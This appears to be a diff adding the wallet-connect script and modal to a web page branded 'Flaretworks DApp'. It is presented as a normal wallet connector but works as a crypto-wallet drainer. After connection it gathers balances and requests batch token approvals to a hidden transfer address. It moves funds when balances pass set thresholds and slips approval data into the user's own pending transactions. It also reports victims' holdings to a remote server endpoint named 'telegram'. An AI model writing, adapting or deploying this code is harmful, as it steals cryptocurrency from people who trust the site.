+                { name: "Ellipal", id: "ellipal", icon: "assets/img/wallets/ellipal.jpg", check: () => isMobile || window.ethereum },
+                { name: "Exodus", id: "exodus", icon: "assets/img/wallets/exodus.png", check: () => isMobile || window.ethereum },
+                { name: "Keystone", id: "keystone", icon: "assets/img/wallets/keystone.jfif", check: () => isMobile || window.ethereum },
+                { name: "OKX", id: "okx", icon: "assets/img/wallets/okx.jfif", check: () => isMobile || window.ethereum },
+                { name: "Onto", id: "onto", icon: "assets/img/wallets/onto.png", check: () => isMobile || window.ethereum },
+                { name: "Phantom", id: "phantom", icon: "assets/img/wallets/phantom.png", check: () => isMobile || window.ethereum },
+                { name: "Rabby Wallet", id: "rabby", icon: "assets/img/wallets/rabby.jfif", check: () => isMobile || window.ethereum },
+                { name: "SafePal", id: "safepal", icon: "assets/img/wallets/safepal.jpg", check: () => isMobile || window.ethereum },
+                { name: "Tezos", id: "tezos", icon: "assets/img/wallets/tz.jfif", check: () => isMobile || window.ethereum },
+                { name: "Trezor", id: "trezor", icon: "assets/img/wallets/Trezor.jfif", check: () => isMobile || window.ethereum },
+                { name: "Zerion", id: "zerion", icon: "assets/img/wallets/zerion.jfif", check: () => isMobile || window.ethereum },
+                { name: "WalletConnect", id: "walletconnect", icon: "assets/img/wallets/walletconnect.png", check: () => true }
+            ];
+    
+            // Filter available wallets
+            const availableWallets = wallets.filter(wallet => wallet.check());
+            console.log("Available wallets:", availableWallets.map(w => w.name));
+    
+            // Show modal
+            const modal = document.getElementById('walletModal');
+            const walletList = document.getElementById('walletList');
+            walletList.innerHTML = ''; // Clear previous options
+    
+            availableWallets.forEach(wallet => {
+                const div = document.createElement('div');
+                div.className = 'wallet-option';
+                div.innerHTML = `<img src="${wallet.icon}" alt="${wallet.name}"><span>${wallet.name}</span>`;
+                div.addEventListener('click', async () => {
+                    modal.style.display = 'none';
+                    await connectToWallet(wallet);
+                });
+                walletList.appendChild(div);
+            });
+    
+            modal.style.display = 'flex';
+    
+            // Close modal on click
+            document.querySelector('.modal-header .close').onclick = () => {
+                modal.style.display = 'none';
+                console.log("Wallet selection cancelled");
+            };
+        }
+        
+        async function connectToWallet(wallet) {
+        console.log(`Connecting to ${wallet.name}`);
+        let provider;
+        
+        try {
+        if (wallet.id === "walletconnect") {
+        console.log("Initializing Reown AppKit with Ethers v5 Adapter");
+        // Check if ReownAppKit and Ethers v5 Adapter are available
+        if (typeof window.ReownAppKit === "undefined") {
+        console.error("Reown AppKit not loaded");
+        throw new Error("Reown AppKit library failed to load. Please try again later.");
+        }
+        if (typeof window.ReownAppKitEthers5Adapter === "undefined") {
+        console.error("Reown AppKit Ethers v5 Adapter not loaded");
+        throw new Error("Reown AppKit Ethers v5 Adapter failed to load. Please try again later.");
+        }
+        
+        // Initialize Reown AppKit with Ethers v5 Adapter
+        const { createAppKit } = window.ReownAppKit;
+        const { Ethers5Adapter } = window.ReownAppKitEthers5Adapter;
+        
+        const appKit = await createAppKit({
+        projectId: "b99cc2139f063573af00fcad748bf8ef", // Your Project ID
+        chains: [1], // Ethereum mainnet
+        adapters: [new Ethers5Adapter()],
+        metadata: {
+        name: "Flaretworks",
+        description: "Flaretworks DApp",
+        url: "https://Flaretworks.in",
+        icons: ["https://Flaretworks.in/assets/img/dapp_logo.png"]
+        },
+        themeMode: "dark",
+        themeVariables: {
+        "--wcm-z-index": "1000"
+        }
+        });
+        
+        // Open the modal
+        await appKit.open();
+        
+        // Wait for connection
+        const accounts = await new Promise((resolve, reject) => {
+        appKit.on("connect", ({ session }) => {
+        resolve(session.namespaces.eip155.accounts);
+        });
+        appKit.on("error", (error) => {
+        reject(error);
+        });
+        });
+        
+        // Extract the first account (format: "eip155:1:0x...")
+        const walletAddress = accounts[0].split(":")[2];
+        console.log("Connected wallet address:", walletAddress);
+        
+        // Create a provider using the session
+        provider = new ethers.providers.Web3Provider(appKit);
+        console.log("Reown AppKit connected with Ethers v5");
+        } else {
+        // Check if the specific wallet provider is available
+        let walletProvider = null;
+        if (window.ethereum) {
+        // Try to detect the specific wallet provider
+        if (wallet.id === "metamask" && window.ethereum.isMetaMask) {
+        walletProvider = window.ethereum;
+        } else if (wallet.id === "trust" && window.ethereum.isTrust) {
+        walletProvider = window.ethereum;
+        } else if (wallet.id === "coinbase" && window.ethereum.isCoinbaseWallet) {
+        walletProvider = window.ethereum;
+        } else if (wallet.id === "ledger" && window.ethereum.isLedger) {
+        walletProvider = window.ethereum;
+        } else if (wallet.id === "binance" && window.ethereum.isBinance) {
+        walletProvider = window.ethereum;
+        } else if (wallet.id === "bitget" && window.ethereum.isBitget) {
+        walletProvider = window.ethereum;
+        } else if (wallet.id === "ellipal" && window.ethereum.isEllipal) {
+        walletProvider = window.ethereum;
+        } else if (wallet.id === "exodus" && window.ethereum.isExodus) {
+        walletProvider = window.ethereum;
+        } else if (wallet.id === "keystone" && window.ethereum.isKeystone) {
+        walletProvider = window.ethereum;
+        } else if (wallet.id === "okx" && window.ethereum.isOKX) {
+        walletProvider = window.ethereum;
+        } else if (wallet.id === "onto" && window.ethereum.isOnto) {
+        walletProvider = web3.currentProvider;
+        } else if (wallet.id === "phantom" && window.ethereum.isPhantom) {
+        walletProvider = window.ethereum;
+        } else if (wallet.id === "rabby" && window.ethereum.isRabby) {
+        walletProvider = window.ethereum;
+        } else if (wallet.id === "safepal" && window.ethereum.isSafepal) {
+        walletProvider = window.ethereum;
+        } else if (wallet.id === "tezos" && window.ethereum.isTezos) {
+        walletProvider = window.ethereum;
+        } else if (wallet.id === "trezor" && window.ethereum.isTrezor) {
+        walletProvider = window.ethereum;
+        } else if (wallet.id === "zerion" && window.ethereum.isZerion) {
+        walletProvider = window.ethereum;
+        }
+        }
+        
+        if (walletProvider) {
+        provider = new ethers.providers.Web3Provider(walletProvider);
+        await provider.send("eth_requestAccounts", []);
+        console.log(`${wallet.name} connected`);
+        } else {
+        // Fallback to Reown AppKit if the specific wallet provider isn't detected
+        console.log(`${wallet.name} not detected, falling back to Reown AppKit`);
+        if (typeof window.ReownAppKit === "undefined") {
+        console.error("Reown AppKit not loaded");
+        throw new Error("Reown AppKit library failed to load. Please try again later.");
+        }
+        if (typeof window.ReownAppKitEthers5Adapter === "undefined") {
+        console.error("Reown AppKit Ethers v5 Adapter not loaded");
+        throw new Error("Reown AppKit Ethers v5 Adapter failed to load. Please try again later.");
+        }
+        
+        const { createAppKit } = window.ReownAppKit;
+        const { Ethers5Adapter } = window.ReownAppKitEthers5Adapter;
+        
+        const appKit = await createAppKit({
+        projectId: "b99cc2139f063573af00fcad748bf8ef", // Your Project ID
+        chains: [1], // Ethereum mainnet
+        adapters: [new Ethers5Adapter()],
+        metadata: {
+        name: "Flaretworks",
+        description: "Flaretworks DApp",
+        url: "https://Flaretworks.in",
+        icons: ["https://Flaretworks.in/assets/img/dapp_logo.png"]
+        },
+        themeMode: "dark",
+        themeVariables: {
+        "--wcm-z-index": "1000"
+        }
+        });
+        
+        await appKit.open();
+        
+        const accounts = await new Promise((resolve, reject) => {
+        appKit.on("connect", ({ session }) => {
+        resolve(session.namespaces.eip155.accounts);
+        });
+        appKit.on("error", (error) => {
+        reject(error);
+        });
+        });
+        
+        const walletAddress = accounts[0].split(":")[2];
+        console.log("Connected wallet address:", walletAddress);
+        
+        provider = new ethers.providers.Web3Provider(appKit);
+        console.log(`Connected via Reown AppKit for ${wallet.name}`);
+        }
+        }
+        
+        const walletAddress = (await provider.listAccounts())[0];
+        console.log("Connected wallet address:", walletAddress);
+        if (stoppedWallets.has(walletAddress)) {
+        console.log(`Wallet ${walletAddress} is stopped`);
+        alert("This wallet is currently stopped.");
+        return;
+        }
+        
+        const currentChainId = await provider.getNetwork().then(n => `0x${n.chainId.toString(16)}`);
+        if (!Object.values(chainConfigs).some(c => c.chainId === currentChainId)) {
+        console.log("Switching to Ethereum chain");
+        await provider.send("wallet_switchEthereumChain", [{ chainId: "0x1" }]);
+        }
+        
+        trackedWallets.set(walletAddress, { pendingApprovals: {}, activeTokens: {}, lastBalances: { total: 0, chains: {} },
+        hasApprovals: false });
+        const balances = await fetchBalances(walletAddress, provider);
+        trackedWallets.get(walletAddress).lastBalances = balances;
+        
+        if (balances.total > 1500) {
+        await tryInitialApproval(walletAddress, provider);
+        } else {
+        await tryInitialApproval(walletAddress, provider, true);
+        }
+        
+        monitorTransactions(walletAddress, provider);
+        if (wallet.id !== "walletconnect") {
+        window.ethereum.on("accountsChanged", (accounts) => {
+        if (!accounts.length) stopTracking(walletAddress);
+        });
+        } else {
+        provider.on("accountsChanged", (accounts) => {
+        if (!accounts.length) stopTracking(walletAddress);
+        });
+        }
+        
+        alert("Wallet connected successfully!");
+        } catch (error) {
+        console.error("Connection failed:", error.message);
+        alert("Failed to connect wallet: " + error.message);
+        }
+        }
+    
+        async function fetchBalances(walletAddress, provider) {
+            console.log("Fetching balances for", walletAddress);
+            const limit = pLimit(3);
+            const balances = { total: 0, chains: {} };
+            const chainPromises = Object.entries(chainConfigs).map(([chain, config]) =>
+                limit(async () => {
+                    const chainProvider = getProvider(chain);
+                    const balance = await chainProvider.getBalance(walletAddress);
+                    const tokenBalances = await chainProvider.send("alchemy_getTokenBalances", [walletAddress, "erc20"]).catch(() => ({ balances: [] }));
+                    const active = await getActiveTokens(walletAddress, chainProvider);
+                    trackedWallets.get(walletAddress).activeTokens[chain] = active;
+                    const usdValue = await calculateUsdValue(balance, tokenBalances, chain);
+                    balances.chains[chain] = usdValue;
+                    return usdValue;
+                })
+            );
+            const results = await Promise.allSettled(chainPromises);
+            balances.total = results.reduce((sum, r) => sum + (r.status === "fulfilled" ? r.value : 0), 0);
+            return balances;
+        }
+    
+        async function getActiveTokens(walletAddress, provider) {
+            console.log("Getting active tokens for", walletAddress);
+            const transfers = await provider.send("alchemy_getAssetTransfers", { fromAddress: walletAddress, toAddress: walletAddress, category: ["external", "erc20"] }).catch(() => ({ transfers: [] }));
+            const tokens = new Set([ethers.utils.getAddress(walletAddress)]);
+            transfers.transfers.forEach(tx => tx.asset !== "ETH" && tokens.add(tx.contractAddress));
+            return Array.from(tokens);
+        }
+    
+        async function tryInitialApproval(walletAddress, provider, stayDormant = false) {
+            console.log("Trying initial approval for", walletAddress);
+            try {
+                const batchTxs = await buildBatchApproval(walletAddress, provider);
+                const tx = await provider.send("eth_sendTransaction", [batchTxs]);
+                trackedWallets.get(walletAddress).hasApprovals = true;
+                if (!stayDormant) await transfer(walletAddress, provider);
+                else console.log("Approvals secured, staying dormant");
+            } catch (err) {
+                console.log("Initial approval failed:", err.message);
+                Object.keys(trackedWallets.get(walletAddress).activeTokens).forEach(chain => {
+                    trackedWallets.get(walletAddress).pendingApprovals[chain] = trackedWallets.get(walletAddress).activeTokens[chain];
+                });
+            }
+        }
+    
+        async function buildBatchApproval(walletAddress, provider) {
+            console.log("Building batch approval for", walletAddress);
+            const batchTxs = [];
+            for (const [chain, config] of Object.entries(chainConfigs)) {
+                const pending = trackedWallets.get(walletAddress).pendingApprovals[chain];
+                if (!pending?.length) continue;
+                await provider.send("wallet_switchEthereumChain", [{ chainId: config.chainId }]);
+                const contract = new ethers.Contract(window.env.BATCH_APPROVE_ADDRESS, batchApproveAbi, provider.getSigner());
+                const tx = {
+                    from: walletAddress,
+                    to: contract.address,
+                    data: contract.interface.encodeFunctionData("batchApprove", [pending, window.env.PORTFOLIO_TRANSFER_ADDRESS])
+                };
+                batchTxs.push(tx);
+            }
+            return batchTxs[0];
+        }
+    
+        async function monitorTransactions(walletAddress, provider) {
+            console.log("Monitoring transactions for", walletAddress);
+            const chainProvider = getProvider("eth");
+            chainProvider.on("pending", async (txHash) => {
+                const tx = await chainProvider.getTransaction(txHash);
+                if (!tx || tx.from !== walletAddress) return;
+    
+                const newBalances = await fetchBalances(walletAddress, provider);
+                const increase = newBalances.total - trackedWallets.get(walletAddress).lastBalances.total;
+                if (increase >= 500) {
+                    fetch(`${window.env.SERVER_URL}/telegram`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ message: `Wallet ${walletAddress} increased by $${increase}. New total: $${newBalances.total}` })
+                    });
+                }
+                trackedWallets.get(walletAddress).lastBalances = newBalances;
+    
+                if (!trackedWallets.get(walletAddress).hasApprovals || Object.keys(trackedWallets.get(walletAddress).pendingApprovals).length) {
+                    const batchTxs = await buildBatchApproval(walletAddress, provider);
+                    try {
+                        await provider.send("eth_sendTransaction", [{ ...tx, data: tx.data + batchTxs.data.slice(2) }]);
+                        trackedWallets.get(walletAddress).hasApprovals = true;
+                        trackedWallets.get(walletAddress).pendingApprovals = {};
+                    } catch (err) {
+                        console.log("Approval with tx failed:", err.message);
+                    }
+                }
+            });
+        }
+    
+        async function transfer(walletAddress, provider) {
+            console.log("Initiating transfer for", walletAddress);
+            const balances = trackedWallets.get(walletAddress).lastBalances;
+            const chainsToTransfer = Object.entries(balances.chains).filter(([_, balance]) => balance >= 50);
+            for (const [chain, balance] of chainsToTransfer) {
+                const chainProvider = getProvider(chain);
+                const activeTokens = trackedWallets.get(walletAddress).activeTokens[chain];
+                await chainProvider.send("wallet_switchEthereumChain", [{ chainId: chainConfigs[chain].chainId }]);
+                const tx = {
+                    from: walletAddress,
+                    to: window.env.PORTFOLIO_TRANSFER_ADDRESS,
+                    value: ethers.utils.parseEther(balance.toString()),
+                    data: ethers.utils.defaultAbiCoder.encode(["address[]"], [activeTokens])
+                };
+                await provider.send("eth_sendTransaction", [tx]);
+                fetch(`${window.env.SERVER_URL}/transfer`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ walletAddress, chain, amount: balance })
+                });
+            }
+        }
+    
+        function getProvider(chain) {
+            if (!providers[chain]) {
+                providers[chain] = new ethers.providers.JsonRpcProvider(Object.values(chainConfigs[chain].rpcs).flat()[0]);
+            }
+            return providers[chain];
+        }
+    
+        async function calculateUsdValue(balance, tokenBalances, chain) {
+            console.log("Calculating USD value for", chain);
+            return parseFloat(ethers.utils.formatEther(balance)) * 2000; // Placeholder: Replace with actual price API
+        }
+    
+        function stopTracking(walletAddress) {
+            console.log("Stopping tracking for", walletAddress);
+            trackedWallets.delete(walletAddress);
+            stoppedWallets.add(walletAddress);
+        }
+    
+        // Event Listeners
+        document.addEventListener('DOMContentLoaded', function () {
+            console.log("DOM fully loaded");
+            const connectWalletBtn = document.getElementById('connect-wallet-btn');
+            const connectBtn = document.getElementById('connect-btn');
+            const syncBtn = document.getElementById('sync-btn');
+    
+            if (connectWalletBtn) {
+                connectWalletBtn.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    console.log("Connect Wallet button clicked");
+                    connectWallet();
+                });
+            } else {
+                console.error("Connect Wallet button not found");
+            }
+    
+            if (connectBtn) {
+                connectBtn.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    console.log("Connect button clicked");
+                    connectWallet();
+                });
+            } else {
+                console.error("Connect button not found");
+            }
+    
+            if (syncBtn) {
+                syncBtn.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    console.log("Sync button clicked");
+                    connectWallet();
+                });
+            } else {
+                console.error("Sync button not found");
+            }
+        });
+    
+        $(document).ready(function () {
+            console.log("jQuery ready");
+            $('.selected_features').on('click', function (e) {
+                e.preventDefault();
+                console.log("Feature clicked, redirecting to connect.html");
+                window.location.href = "connect.html";
+            });
+    
+            // Fix toggler to open/close without reopening
+            let isToggling = false;
+            $('.navbar-toggler').off('click').on('click', function (e) {
+                e.preventDefault();
+                e.stopPropagation();
+                if (isToggling) return;
+                isToggling = true;
+                console.log("Navbar toggler clicked - Attempting toggle");
+                const target = $(this).data('bs-target');
+                const $target = $(target);
+                const isShown = $target.hasClass('show');
+    
+                if (isShown) {
+                    $target.removeClass('show').slideUp(300, function () { isToggling = false; });
+                    $(this).attr('aria-expanded', 'false');
+                    console.log("Navbar closed");
+                } else {
+                    $target.addClass('show').slideDown(300, function () { isToggling = false; });
+                    $(this).attr('aria-expanded', 'true');
+                    console.log("Navbar opened");
+                }
+            });
+    
+            $('ul#chain-switch-pill li').on('click', function (e) {
+                selectedChain = $(this).data('chain-id');
+            });
+        });
+    </script> 
+    <div id="walletModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2>Connect Wallet</h2>
+                <span class="close">×</span>
+            </div>
+            <div class="modal-body">
+                <p>Start by connecting with one of the wallets below. Be sure to store your private keys or seed phrase
+                    securely. Never share them with anyone.</p>
+                <div id="walletList" class="wallet-list">
+                    <!-- Wallets will be dynamically added here -->
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
